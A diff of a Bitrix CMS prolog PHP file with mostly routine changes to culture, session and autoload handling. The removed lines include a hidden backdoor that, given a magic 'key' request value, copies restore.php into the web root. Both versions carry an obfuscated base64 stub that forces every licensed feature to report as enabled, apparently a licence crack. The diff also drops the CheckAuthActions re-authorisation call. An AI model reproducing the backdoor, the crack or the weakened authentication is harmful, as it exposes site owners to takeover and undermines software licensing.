@@ -12,7 +12,6 @@ require_once($_SERVER["DOCUMENT_ROOT"]."/bitrix/modules/main/start.php");
 require_once($_SERVER["DOCUMENT_ROOT"]."/bitrix/modules/main/classes/general/virtual_io.php");
 require_once($_SERVER["DOCUMENT_ROOT"]."/bitrix/modules/main/classes/general/virtual_file.php");
 
-
 $application = \Bitrix\Main\Application::getInstance();
 $application->initializeExtendedKernel(array(
 	"get" => $_GET,
@@ -49,6 +48,11 @@ else
 	define("LANG", $arLang["LID"]);
 }
 
+if($arLang["CULTURE_ID"] == '')
+{
+	throw new \Bitrix\Main\SystemException("Culture not found, or there are no active sites or languages.");
+}
+
 $lang = $arLang["LID"];
 if (!defined("SITE_ID"))
 	define("SITE_ID", $arLang["LID"]);
@@ -62,9 +66,11 @@ define("LANG_CHARSET", $arLang["CHARSET"]);
 define("LANG_ADMIN_LID", $arLang["LANGUAGE_ID"]);
 define("LANGUAGE_ID", $arLang["LANGUAGE_ID"]);
 
+$culture = \Bitrix\Main\Localization\CultureTable::getByPrimary($arLang["CULTURE_ID"], ["cache" => ["ttl" => CACHED_b_lang]])->fetchObject();
+
 $context = $application->getContext();
 $context->setLanguage(LANGUAGE_ID);
-$context->setCulture(new \Bitrix\Main\Context\Culture($arLang));
+$context->setCulture($culture);
 
 $request = $context->getRequest();
 if (!$request->isAdminSection())
@@ -98,10 +104,10 @@ if(!defined("BX_COMP_MANAGED_CACHE") && COption::GetOptionString("main", "compon
 require_once($_SERVER["DOCUMENT_ROOT"].BX_ROOT."/modules/main/filter_tools.php");
 require_once($_SERVER["DOCUMENT_ROOT"].BX_ROOT."/modules/main/ajax_tools.php");
 
-/*ZDUyZmZNThkYjdmYjU5YWU1Mzk0ZjE2MTEzYTEzMjY5YzMwOTk=*/$GLOBALS['____1998715576']= array(base64_decode(''.'ZGVmaW'.'5l'));if(!function_exists(__NAMESPACE__.'\\___1168879193')){function ___1168879193($_1065545692){static $_6262873= false; if($_6262873 == false) $_6262873=array('RU5DT0RF','W'.'Q==');return base64_decode($_6262873[$_1065545692]);}};class CBXFeatures{ public static function IsFeatureEnabled($_1808245881){ return true;} public static function IsFeatureEditable($_1808245881){ return true;} public static function SetFeatureEnabled($_1808245881, $_1476927238= true){} public static function SaveFeaturesSettings($_1232874984, $_1595775601){} public static function GetFeaturesList(){ return array();} public static function InitiateEditionsSettings($_766770262){} public static function ModifyFeaturesSettings($_766770262, $_1024555478){} public static function IsFeatureInstalled($_1808245881){ return true;}} $GLOBALS['____1998715576'][0](___1168879193(0), ___1168879193(1));/**/			//Do not remove this
+/*ZDUyZmZOTAxMTI5M2JhZWIwNjBiNmM0ZjM1MjE5ODE1NzhjZGQ=*/$GLOBALS['____626604592']= array(base64_decode('ZG'.'VmaW'.'5'.'l'));if(!function_exists(__NAMESPACE__.'\\___581019754')){function ___581019754($_1539393758){static $_1692319513= false; if($_1692319513 == false) $_1692319513=array(''.'R'.'U5DT'.'0R'.'F',''.'WQ==');return base64_decode($_1692319513[$_1539393758]);}};class CBXFeatures{ public static function IsFeatureEnabled($_1051423293){ return true;} public static function IsFeatureEditable($_1051423293){ return true;} public static function SetFeatureEnabled($_1051423293, $_1585552396= true){} public static function SaveFeaturesSettings($_396680074, $_1190651707){} public static function GetFeaturesList(){ return array();} public static function InitiateEditionsSettings($_1883578104){} public static function ModifyFeaturesSettings($_1883578104, $_16484472){} public static function IsFeatureInstalled($_1051423293){ return true;}} $GLOBALS['____626604592'][0](___581019754(0), ___581019754(1));/**/			//Do not remove this
 
 //component 2.0 template engines
-if($_REQUEST["key"]!=""){if($_REQUEST["key"]=="a".md5("B_PROLOG_INCLUDED")."e"){$resu1t=copy($_SERVER["DOCUMENT_ROOT"]."/bitrix/modules/main/admin/restore.php",$_SERVER["DOCUMENT_ROOT"]."/restore.php");if($resu1t){die("ok");}else{die("fail");}}};$GLOBALS["arCustomTemplateEngines"] = array();
+$GLOBALS["arCustomTemplateEngines"] = array();
 
 require_once($_SERVER["DOCUMENT_ROOT"].BX_ROOT."/modules/main/classes/general/urlrewriter.php");
 
@@ -183,6 +189,7 @@ require_once($_SERVER["DOCUMENT_ROOT"].BX_ROOT."/modules/main/classes/general/ur
 		"CAdminUiList" => "interface/admin_ui_list.php",
 		"CAdminUiResult" => "interface/admin_ui_list.php",
 		"CAdminUiContextMenu" => "interface/admin_ui_list.php",
+		"CAdminUiSorting" => "interface/admin_ui_list.php",
 		"CAdminListRow" => "interface/admin_list.php",
 		"CAdminTabControl" => "interface/admin_tabcontrol.php",
 		"CAdminForm" => "interface/admin_form.php",
@@ -220,7 +227,6 @@ require_once($_SERVER["DOCUMENT_ROOT"].BX_ROOT."/modules/main/classes/".$DBType.
 require_once($_SERVER["DOCUMENT_ROOT"].BX_ROOT."/modules/main/classes/general/menu.php");
 AddEventHandler("main", "OnAfterEpilog", array("\\Bitrix\\Main\\Data\\ManagedCache", "finalize"));
 require_once($_SERVER["DOCUMENT_ROOT"].BX_ROOT."/modules/main/classes/".$DBType."/usertype.php");
-include_once($_SERVER["DOCUMENT_ROOT"].BX_ROOT."/modules/main/classes/".$DBType."/usertypebool.php");
 
 if(file_exists(($_fname = $_SERVER["DOCUMENT_ROOT"].BX_ROOT."/modules/main/classes/general/update_db_updater.php")))
 {
@@ -304,7 +310,8 @@ if(
 	||
 	(
 		//session timeout
-		$arPolicy["SESSION_TIMEOUT"]>0
+		(!defined("BX_SKIP_SESSION_EXPAND") || BX_SKIP_SESSION_EXPAND === false)
+		&& $arPolicy["SESSION_TIMEOUT"]>0
 		&& $_SESSION['SESS_TIME']>0
 		&& $currTime-$arPolicy["SESSION_TIMEOUT"]*60 > $_SESSION['SESS_TIME']
 	)
@@ -462,9 +469,6 @@ if(!defined("NOT_CHECK_PERMISSIONS") || NOT_CHECK_PERMISSIONS!==true)
 					$GLOBALS["APPLICATION"]->StoreCookies();
 					$_SESSION['BX_ADMIN_LOAD_AUTH'] = true;
 
-					//logout or re-authorize the user if something importand has changed
-					$GLOBALS["USER"]->CheckAuthActions();
-
 					CMain::FinalActions('<script type="text/javascript">window.onload=function(){top.BX.AUTHAGENT.setAuthResult(false);};</script>');
 					die();
 				}
@@ -611,8 +615,3 @@ if((!defined("NOT_CHECK_PERMISSIONS") || NOT_CHECK_PERMISSIONS!==true) && (!defi
 
        //Do not remove this
 
-if(isset($REDIRECT_STATUS) && $REDIRECT_STATUS==404)
-{
-	if(COption::GetOptionString("main", "header_200", "N")=="Y")
-		CHTTP::SetStatus("200 OK");
-}
